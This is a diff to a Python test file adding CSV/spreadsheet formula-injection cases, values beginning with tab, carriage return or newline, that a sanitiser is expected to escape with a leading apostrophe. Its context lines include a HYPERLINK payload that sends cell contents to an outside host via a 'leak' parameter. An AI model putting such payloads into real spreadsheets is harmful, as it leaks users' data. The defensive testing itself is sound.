@@ -630,6 +630,10 @@ def test_get_value_at_path_default():
             '=HYPERLINK("http://contextis.co.uk?leak="&A1&A2,"Error: please click for further information")',
             '\'=HYPERLINK("http://contextis.co.uk?leak="&A1&A2,"Error: please click for further information")',
         ),
+        # A leading tab, carriage return or newline can also trigger a formula.
+        ("\t=1+1", "'\t=1+1"),
+        ("\r=1+1", "'\r=1+1"),
+        ("\n=HYPERLINK(1)", "'\n=HYPERLINK(1)"),
     ],
 )
 def test_dangerous_sample_payloads(input, expected):
